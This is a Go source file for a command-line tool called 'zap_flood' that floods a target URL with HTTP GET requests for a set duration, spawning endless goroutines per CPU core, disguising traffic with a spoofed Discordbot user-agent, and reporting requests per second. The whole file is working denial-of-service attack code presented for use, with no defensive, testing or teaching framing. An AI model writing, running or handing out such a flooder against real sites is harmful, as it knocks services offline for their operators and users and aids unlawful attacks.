package main

import (
	"fmt"
	"net/http"
	"os"
	"sync/atomic"
	"time"
	"runtime"
	"strconv"
)

var counter uint64

// This function handles the actual request flooding
func flood(target string, duration int) {
	client := &http.Client{
		Transport: &http.Transport{
			MaxIdleConnsPerHost: 10000,
		},
		Timeout: time.Second * 5,
	}

	// Set the end time based on the duration
	end := time.Now().Add(time.Duration(duration) * time.Second)

	// Infinite loop until duration ends
	for time.Now().Before(end) {
		go func() {
			// Log that we're sending a request
			req, err := http.NewRequest("GET", target, nil)
			if err != nil {
				fmt.Println("Error creating request:", err)
				return
			}

			// Set user-agent to simulate a real client
			req.Header.Set("User-Agent", "Discordbot/2.0 (+https://discordapp.com)")
			// Send the request
			resp, err := client.Do(req)
			if err == nil {
				resp.Body.Close() // Close the body of the response to avoid leaks
				atomic.AddUint64(&counter, 1) // Increase the counter after a successful request
			} else {
				fmt.Println("Request error:", err) // Log any errors that happen while sending
			}
		}()
	}
}

// Main function to parse inputs and start the flood
func main() {
	// Ensure valid input
	if len(os.Args) < 3 {
		fmt.Println("Usage: zap_flood <url> <duration_in_seconds>")
		return
	}

	// Get target URL and duration from the command-line arguments
	target := os.Args[1]

	// Parse duration from string to integer
	duration, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Invalid duration. Please provide a valid number for duration.")
		return
	}

	// Print that we're starting the attack
	fmt.Printf("Launching HTTP flood on %s for %d seconds using %d threads\n", target, duration, runtime.NumCPU())

	// Start the flooding using multiple threads (based on CPU cores)
	for i := 0; i < runtime.NumCPU(); i++ {
		go flood(target, duration)
	}

	// Setup ticker and done channel for logging and duration control
	ticker := time.NewTicker(5 * time.Second)
	done := time.After(time.Duration(duration) * time.Second)

	var lastCount uint64

loop:
	for {
		select {
		case <-ticker.C:
			// Every 5 seconds, log the total and requests per second (RPS)
			now := atomic.LoadUint64(&counter)
			rps := now - lastCount
			lastCount = now
			fmt.Printf("[ZAP FLOOD] Total: %d | RPS: %d\n", now, rps)
		case <-done:
			// Stop after the given duration
			break loop
		}
	}

	// After the flood ends, print total requests sent
	fmt.Printf("Flooding ended. Total Requests: %d\n", counter)
}
